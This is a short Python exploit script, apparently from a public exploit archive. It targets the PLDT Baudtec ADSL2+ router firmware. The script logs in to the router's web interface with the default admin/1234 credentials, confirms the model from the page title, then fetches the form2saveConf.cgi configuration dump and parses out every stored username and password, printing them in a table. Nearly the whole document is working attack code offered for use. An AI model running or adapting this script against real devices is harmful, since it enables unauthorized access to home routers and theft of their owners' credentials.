#!/usr/bin/python3
# Exploit Title: [PLDT Baudtec Admin credentials]
# Date: [09/04/2017]
# Exploit Author: [Abdulsalam A. Shahlol]
# Vendor Homepage: [http://www.baudtec.com.tw/, http://pldthome.com]
# Version: [Firmware Version: RNR4_A72T_PLD_0.19R3 /Built Date:	Aug 20 2015 15:24:01] 
# Tested on: [Windows10]


import urllib.request
import re
print("""  ___ _    ___ _____           _       _         ___            _         _   _      _     
 | _ \ |  |   \_   _|  __ _ __| |_ __ (_)_ _    / __|_ _ ___ __| |___ _ _| |_(_)__ _| |___ 
 |  _/ |__| |) || |   / _` / _` | '  \| | ' \  | (__| '_/ -_) _` / -_) ' \  _| / _` | (_-< 
 |_| |____|___/ |_|   \__,_\__,_|_|_|_|_|_||_|  \___|_| \___\__,_\___|_||_\__|_\__,_|_/__/ 
                                                                                           """)
print("By: Abdulsalam A. Shahlol Email:abdulsalamshahlol@gmail.com")
url = 'http://192.168.1.1/'
form_url = url + 'login.htm'
action_url = url + 'login.cgi'
username = 'admin'
password = '1234'

test= {
    'username': username,
    'password': password,
	'submit.htm?login.htm':'Send'
  }

x = urllib.request.urlopen(form_url)
resp = x.read().decode('utf-8')
regex = '<title>(.+?)</title>'
p = re.compile(regex)
title = re.findall(p,resp )

if title[0]=="300Mbps WLAN ADSL2+ Router":
  data = urllib.parse.urlencode(test)
  data = data.encode('utf-8') # data should be bytes
  req = urllib.request.Request(action_url, data)
  resp = urllib.request.urlopen(req)
  respData = resp.read()

  try:
    x = urllib.request.urlopen(url+'form2saveConf.cgi')
    resp = x.read().decode('utf-8')
    regex='\n(\<V N=\"USERNAME\" V=.+)\n(\<V N=\"PASSWORD\" V=.+)\n'
    p = re.compile(regex)
    t = re.findall(p,resp)
    print("List of users found:\n\n ")
    print ("{:_<38}\n|{:<2}| {:<10}|{:^20}|{:_<39}".format("_",'No.','Username',"Password","\n"))
    cred=[]
    for x in t:
      regex = '(V=.\w+)'
      p = re.compile(regex)
      usr = re.search(p,x[0]).group()
      pas = re.search(p,x[1]).group()
      xx=usr[3:]
      xx2=pas[3:]
      cred.append([xx,xx2])
    
    c=1
    for name,num in cred:
       print ("|{:<2} | {:<10}|{:^20}|".format(c,name,num))
       c+=1
  except Exception as e:
    print(str(e))
else:
    print("Router isn't supported")
